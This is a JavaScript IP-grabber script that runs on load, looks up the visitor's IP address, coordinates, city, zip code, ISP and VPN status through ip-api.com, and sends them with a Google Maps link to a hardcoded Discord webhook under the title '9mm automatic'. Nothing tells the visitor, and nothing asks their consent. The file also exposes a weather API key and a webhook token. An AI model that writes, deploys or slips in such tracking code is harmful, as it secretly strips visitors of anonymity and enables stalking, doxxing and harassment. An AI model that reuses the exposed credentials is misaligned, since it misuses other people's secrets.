function fetchGoogleMapsLocation(latitude, longitude) {
    return `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}`;
}

function fetchWeatherData(city) {
    const apiKey = "3bc56f53295e4e60890180255240505";
    const apiUrl = `http://api.weatherapi.com/v1/current.json?key=${apiKey}&q=${city}&aqi=no`;

    return fetch(apiUrl)
        .then(response => response.json())
        .then(data => {
            return {
                temp_c: data.current.temp_c,
                temp_f: data.current.temp_f
            };
        });
}

fetch("http://ip-api.com/json/")
.then(response => response.json())
.then(ipData => {
    const latitude = ipData.lat;
    const longitude = ipData.lon;
    const googleMapsLink = fetchGoogleMapsLocation(latitude, longitude);

    fetchWeatherData(ipData.city)
    .then(weatherData => {
        const embed = {
            "embeds": [{
                "title": "9mm automatic",
                "color": 3447003,
                "fields": [
                    {
                        "name": "🌍 Country",
                        "value": `${ipData.country} :flag_${ipData.countryCode.toLowerCase()}:`
                    },
                    {
                        "name": "📍 Region",
                        "value": `${ipData.region} (${ipData.regionName})`
                    },
                    {
                        "name": "🌆 City",
                        "value": `${ipData.city}`
                    },
                    {
                        "name": "🏠 Zip",
                        "value": `${ipData.zip || 'Not available'}`
                    },
                    {
                        "name": "🌐 Coordinates",
                        "value": `Latitude: ${latitude}, Longitude: ${longitude}`
                    },
                    {
                        "name": "⏰ Timezone",
                        "value": `${ipData.timezone} :clock2:`
                    },
                    {
                        "name": "📡 ISP",
                        "value": `${ipData.isp}`
                    },
                    {
                        "name": "🏢 Organization",
                        "value": `${ipData.org || 'Not available'}`
                    },
                    {
                        "name": "🛰️ AS",
                        "value": `${ipData.as}`
                    },
                    {
                        "name": "🔍 Query",
                        "value": `${ipData.query}`
                    },
                    {
                        "name": "🔒 VPN (Unstable)",
                        "value": `${ipData.proxy ? "Yes" : "No"}`
                    },
                    {
                        "name": "📱 Mobile (Unstable)",
                        "value": `${ipData.mobile ? "Yes" : "No"}`
                    },
                    {
                        "name": "🌡️ Temperature",
                        "value": `${weatherData.temp_c}°C / ${weatherData.temp_f}°F`
                    },
                    {
                        "name": "📍 Location on Google Maps",
                        "value": `[View on Google Maps](${googleMapsLink})`
                    }
                ]
            }]
        };

        const webhookUrl = "https://discord.com/api/webhooks/1246650714193924218/UKyYgq82bRgGStZrm7j8lDF-X0-lrhsxaDlYbmvxsOCD5IcPwgXmEEFC7JRQu125y7xu";
        fetch(webhookUrl, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(embed)
        });
    });
});
